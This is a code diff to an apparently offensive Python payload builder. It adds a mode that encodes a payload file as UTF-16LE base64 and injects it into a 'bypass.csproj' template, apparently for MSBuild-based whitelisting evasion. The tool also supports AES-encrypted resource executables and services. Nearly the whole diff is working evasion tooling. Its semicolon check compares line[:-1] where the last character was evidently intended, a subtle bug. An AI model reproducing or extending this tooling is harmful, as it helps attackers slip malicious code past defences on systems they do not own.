@@ -4,6 +4,7 @@ import sys
 import argparse
 from Crypto.Cipher import AES
 import hashlib
+import base64
 
 class wbl:
 
@@ -29,6 +30,7 @@ class wbl:
 		
 		self.payload_key_hex = ""
 		self.payload_hex = ""
+		self.payload_csproj = ""
 
 	def check_mingw(self):
 
@@ -126,6 +128,29 @@ class wbl:
 			print("\n[!!] ERROR - create_resource_file() - %s" % ex)
 			sys.exit(0)
 
+	def create_csproj_payload(self):
+
+		flines = ""
+		holder = ""
+
+		try:
+			with open(self.args.payload,'r') as f:
+				flines = f.readlines()
+		
+		except Exception as ex:
+			print("\n[!!] ERROR - create_csproj_payload() - %s" % ex)
+			sys.exit(0)
+
+		for line in flines:
+			
+			line = str(line).rstrip()
+
+			if line[:-1] != ";": line += ";"
+			
+			holder += line
+
+		self.payload_csproj = base64.b64encode(holder.encode('UTF-16LE'))
+
 	def create_payload_file(self):
 
 		flines = ""
@@ -184,14 +209,14 @@ class wbl:
 			case "csproj":
 			
 				try:
-					print("[*] Writing source code file with PAYLOADKEY replacement...")
+					print("[*] Writing source code file with PAYLOAD replacement...",end='')
 					with open("./bypass.csproj",'w') as nf:
 
 						for line in flines:
 							
-							if "<<<PAYLOAD>>>" in line:  nf.write(line)
+							if "<<<PAYLOAD>>>" in line:  nf.write(line.replace("<<<PAYLOAD>>>",self.payload_csproj.decode('UTF-8')))
 							else: nf.write(line)
-					print("done (./bypass.csproj).")
+					print("done (./bypass.csproj).\n")
 
 				except Exception as ex:
 					print("\n[!!] ERROR - create_payload_file() - csproj - Create bypass.csproj file: %s" % ex)
@@ -289,10 +314,15 @@ if __name__ == '__main__':
 			w.create_payload_file();
 			w.compile_payload_file();
 
-		case "resource-exe" | "resource-service":
+		case "resource-exe" | "resource-service-exe":
 
 			w.create_encrypted_file();
 			w.create_resource_rc_file();
 			w.create_resource_h_file();
 			w.create_payload_file();
 			w.compile_payload_file();
+		
+		case "csproj":
+
+			w.create_csproj_payload();
+			w.create_payload_file();
